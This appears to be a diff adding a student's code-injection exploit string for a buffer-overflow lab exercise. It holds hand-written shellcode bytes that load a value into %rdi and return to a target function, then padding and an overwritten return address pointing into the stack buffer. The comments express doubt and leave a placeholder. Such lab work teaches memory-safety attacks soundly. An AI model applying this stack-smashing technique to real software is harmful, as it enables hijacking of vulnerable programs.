@@ -1,0 +1,10 @@
+48 c7 c7 93 82 38 76	/* is this mov   $0x76388283,%rdi ? */
+48 83 ec 24    	  	/* sub   $0xYY,%rsp */
+			/* set rsp to (48-YY)th byte where touch2 */
+      	 		/* address is */
+c3			/* ret */
+6e 18 40 00 00 00 00 00 /* touch2 address */
+69 69 69 69 69 69 69 69 /* padding */
+69 69 69 69 69 69 69 69
+69 69 69 69
+18 13 61 55 00 00 00 00 /* beginning of buffer */
